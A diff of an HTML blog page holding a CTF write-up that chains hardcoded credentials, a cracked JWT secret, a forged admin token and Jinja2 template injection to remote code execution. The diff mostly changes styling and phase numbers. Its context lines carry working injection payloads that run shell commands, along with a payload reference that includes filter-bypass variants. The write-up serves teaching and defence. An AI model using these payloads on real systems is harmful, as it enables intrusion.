@@ -24,7 +24,7 @@
                 <span class="px-3 py-1 bg-white/20 backdrop-blur-sm rounded-full text-sm font-medium">RCE</span>
                 <span class="px-3 py-1 bg-white/20 backdrop-blur-sm rounded-full text-sm font-medium">JWT</span>
             </div>
-            <h1 class="text-4xl md:text-5xl font-bold mb-4">Boot Sequence CTF Challenge - Round 2: From JWT Forgery to SSTI Remote Code Execution</h1>
+            <h1 class="text-4xl md:text-5xl font-bold mb-4">Boot Sequence CTF Challenge - Round 2: <span class="font-medium">From JWT Forgery to SSTI Remote Code Execution</span></h1>
             <div class="flex items-center gap-6 text-indigo-100">
                 <span><i class="fas fa-user mr-2"></i>Abishek Kumar</span>
                 <span><i class="fas fa-calendar mr-2"></i>December 14, 2025</span>
@@ -38,14 +38,14 @@
             
             <h2>Introduction</h2>
             <p>Imagine being tasked with rebooting an orbital relay control system before an entire fleet drifts off-course into the void of space. This was the premise of the "Boot Sequence" CTF challenge from CloudSek Research Team CTF 2025 — a thrilling web exploitation scenario that combined multiple attack vectors into a devastating vulnerability chain.</p>
-            
+            </br>
             <p>In this write-up, I'll walk you through how I exploited a web application from initial reconnaissance to complete system compromise, demonstrating:</p>
             <ul>
-                <li>🔍 Information disclosure in client-side JavaScript</li>
-                <li>🔐 JWT secret cracking and token forgery</li>
-                <li>🎭 Privilege escalation through authentication bypass</li>
-                <li>💉 Server-Side Template Injection (SSTI)</li>
-                <li>🚀 Remote Code Execution (RCE) via Jinja2</li>
+                <li>Information disclosure in client-side JavaScript</li>
+                <li>JWT secret cracking and token forgery</li>
+                <li>Privilege escalation through authentication bypass</li>
+                <li>Server-Side Template Injection (SSTI)</li>
+                <li>Remote Code Execution (RCE) via Jinja2</li>
             </ul>
 
             <div class="bg-red-50 border-l-4 border-red-500 p-6 my-8 dark:bg-gray-800 dark:border-red-400">
@@ -53,7 +53,7 @@
                 <p class="text-red-800 dark:text-red-200">This vulnerability chain represents a complete system compromise with maximum impact on confidentiality, integrity, and availability.</p>
             </div>
 
-            <hr class="my-12">
+            <hr class="my-12 border-0 h-px bg-gray-400 dark:bg-gray-500">
 
             <h2>Phase 1: Reconnaissance - Finding the Keys</h2>
             
@@ -81,7 +81,7 @@ const FLIGHT_CREDENTIALS = {
                 <p class="text-yellow-800 dark:text-yellow-200">Hardcoded credentials exposed in publicly accessible JavaScript. Any visitor to the application can obtain valid authentication credentials without any attack.</p>
             </div>
 
-            <hr class="my-12">
+            <hr class="my-12 border-0 h-px bg-gray-400 dark:bg-gray-500">
 
             <h2>Phase 2: Initial Access - Operator Login</h2>
             
@@ -93,10 +93,10 @@ const FLIGHT_CREDENTIALS = {
     "iat": 1765693695,
     "exp": 1765697295
 }</code></pre>
-
+</br>
             <p><strong>Key Observation:</strong> The role is set to <code>operator</code>, not <code>admin</code>. This would need to be changed to access privileged functions.</p>
 
-            <hr class="my-12">
+            <hr class="my-12 border-0 h-px bg-gray-400 dark:bg-gray-500">
 
             <h2>Phase 3: Discovering the Admin Panel</h2>
             
@@ -107,6 +107,7 @@ document.querySelectorAll('.admin-locked').forEach(el =&gt; {
     el.classList.remove('hidden');
     el.classList.remove('admin-locked');
 });</code></pre>
+</br>
 
             <p>This revealed the <strong>Quantum Admin Beacon</strong> interface!</p>
 
@@ -128,7 +129,7 @@ Response:
 
             <p><strong>Access denied.</strong> I needed to escalate my privileges.</p>
 
-            <hr class="my-12">
+            <hr class="my-12 border-0 h-px bg-gray-400 dark:bg-gray-500">
 
             <h2>Phase 4: JWT Forgery - Becoming Admin</h2>
             
@@ -140,6 +141,7 @@ Response:
 [+] butterfly loaded from list
 
 [+] Secret key: butterfly</code></pre>
+<br>
 
             <p class="text-xl font-bold text-red-600 dark:text-red-400">Success! The JWT secret was the incredibly weak password: "butterfly"</p>
 
@@ -173,9 +175,9 @@ location.reload();</code></pre>
                 <p class="text-green-800 dark:text-green-200">The interface transformed! I now had access to the Quantum Admin Beacon with full administrative privileges.</p>
             </div>
 
-            <hr class="my-12">
+            <hr class="my-12 border-0 h-px bg-gray-400 dark:bg-gray-500">
 
-            <h2>Phase 6: SSTI Discovery - Breaking the Template</h2>
+            <h2>Phase 5: SSTI Discovery - Breaking the Template</h2>
             
             <h3>Testing for Template Injection</h3>
             <p>Server-Side Template Injection (SSTI) occurs when user input is embedded into template engines without proper sanitization. I tested basic SSTI payloads:</p>
@@ -200,9 +202,9 @@ fetch('/api/admin/hyperpulse', {
                 <p class="text-xl font-bold text-blue-900 dark:text-blue-300 mt-4">🎯 SSTI CONFIRMED!</p>
             </div>
 
-            <hr class="my-12">
+            <hr class="my-12 border-0 h-px bg-gray-400 dark:bg-gray-500">
 
-            <h2>Phase 7: SSTI Exploitation - From Injection to RCE</h2>
+            <h2>Phase 6: SSTI Exploitation - From Injection to RCE</h2>
             
             <h3>Understanding Jinja2 SSTI</h3>
             <p>Jinja2 template injection can lead to Remote Code Execution through Python's object introspection. The attack chain:</p>
@@ -230,9 +232,9 @@ fetch('/api/admin/hyperpulse', {
                 </ul>
             </div>
 
-            <hr class="my-12">
+            <hr class="my-12 border-0 h-px bg-gray-400 dark:bg-gray-500">
 
-            <h2>Phase 8: Examining Flag Files</h2>
+            <h2>Phase 7: Examining Flag Files</h2>
             
             <h3>Reading flag.txt</h3>
             <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>&#123;&#123;lipsum.__globals__.os.popen('cat /tmp/flag.txt').read()&#125;&#125;
@@ -240,6 +242,7 @@ fetch('/api/admin/hyperpulse', {
 Response:
 This is not the flag you're looking for.
 Try executing flag.py instead!</code></pre>
+</br>
 
             <p>A red herring! The real flag requires executing <code>flag.py</code>.</p>
 
@@ -263,21 +266,21 @@ def decrypt_flag(key):
 if __name__ == '__main__':
     print(get_root_flag())</code></pre>
 
-            <hr class="my-12">
+            <hr class="my-12 border-0 h-px bg-gray-400 dark:bg-gray-500">
 
-            <h2>Phase 9: Flag Retrieval - The Final Strike</h2>
+            <h2>Phase 8: Flag Retrieval - The Final Strike</h2>
             
             <h3>Executing flag.py</h3>
             <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>&#123;&#123;lipsum.__globals__.os.popen('python3 /tmp/flag.py').read()&#125;&#125;</code></pre>
 
             <div class="bg-green-50 border-l-4 border-green-500 p-8 my-8 text-center dark:bg-gray-800 dark:border-green-400">
                 <p class="text-3xl font-bold text-green-900 mb-4 dark:text-green-300">🎉 FLAG CAPTURED!</p>
-                <p class="text-xl font-mono bg-white p-4 rounded-lg text-gray-800 dark:bg-gray-900 dark:text-green-400">ClOuDsEk_ReSeArCH_tEaM_CTF_2025{997c4f47961b43ceaf327e08bc45ad0b}</p>
+                <p class="text-xl font-mono bg-white p-4 rounded-lg text-gray-800 dark:bg-gray-900 dark:text-green-400 overflow-x-auto">ClOuDsEk_ReSeArCH_tEaM_CTF_2025{997c4f47961b43ceaf327e08bc45ad0b}</p>
             </div>
 
             <p class="text-center text-lg font-semibold">Mission accomplished! The orbital relay is under my control.</p>
 
-            <hr class="my-12">
+            <hr class="my-12 border-0 h-px bg-gray-400 dark:bg-gray-500">
 
             <h2>Vulnerability Analysis</h2>
             
@@ -331,7 +334,7 @@ if __name__ == '__main__':
 
             <div class="bg-red-50 border-l-4 border-red-500 p-6 my-8 dark:bg-gray-800 dark:border-red-400">
                 <p class="font-semibold text-red-900 mb-2 dark:text-red-300">Overall CVSS Score</p>
-                <p class="text-2xl font-bold text-red-600 mb-2">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</p>
+                <p class="text-2xl font-bold text-red-600 mb-2 overflow-x-auto"> CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</p>
                 <p class="text-3xl font-bold text-red-900 dark:text-red-300">Score: 10.0 (Critical)</p>
                 <p class="text-red-800 mt-4 dark:text-red-200">
                     <strong>Justification:</strong> Network-accessible, low attack complexity, no privileges required initially, 
@@ -339,7 +342,7 @@ if __name__ == '__main__':
                 </p>
             </div>
 
-            <hr class="my-12">
+            <hr class="my-12 border-0 h-px bg-gray-400 dark:bg-gray-500">
 
             <h2>Defense Strategies</h2>
             
@@ -380,7 +383,7 @@ render_template('response.html', data=escape(input))</code></pre>
                 <li>✅ Monitor for suspicious patterns in logs</li>
             </ul>
 
-            <hr class="my-12">
+            <hr class="my-12 border-0 h-px bg-gray-400 dark:bg-gray-500">
 
             <h2>Advanced SSTI Payloads Reference</h2>
             
@@ -389,16 +392,12 @@ render_template('response.html', data=escape(input))</code></pre>
                 <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>&#123;&#123;7*7&#125;&#125;              # Returns: 49
 &#123;&#123;7*'7'&#125;&#125;            # Returns: 7777777
 &#123;&#123;'foo'*3&#125;&#125;          # Returns: foofoofoo</code></pre>
-            </div>
-
-            <div class="bg-gray-100 p-6 rounded-lg my-6 dark:bg-gray-800">
+                </br>
                 <h4 class="font-bold mb-3 dark:text-white">Remote Code Execution</h4>
                 <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code>&#123;&#123;lipsum.__globals__.os.popen('whoami').read()&#125;&#125;
 &#123;&#123;lipsum.__globals__.os.popen('id').read()&#125;&#125;
 &#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code></pre>
-            </div>
-
-            <div class="bg-gray-100 p-6 rounded-lg my-6 dark:bg-gray-800">
+                </br>
                 <h4 class="font-bold mb-3 dark:text-white">Bypassing Filters</h4>
                 <pre class="bg-gray-900 text-green-400 p-4 rounded-lg overflow-x-auto"><code># If "os" is filtered
 &#123;&#123;lipsum.__globals__['o'+'s'].popen('id').read()&#125;&#125;
@@ -407,7 +406,7 @@ render_template('response.html', data=escape(input))</code></pre>
 &#123;&#123;request['application']['__globals__']['__builtins__']&#125;&#125;</code></pre>
             </div>
 
-            <hr class="my-12">
+            <hr class="my-12 border-0 h-px bg-gray-400 dark:bg-gray-500">
 
             <h2>Conclusion</h2>
             
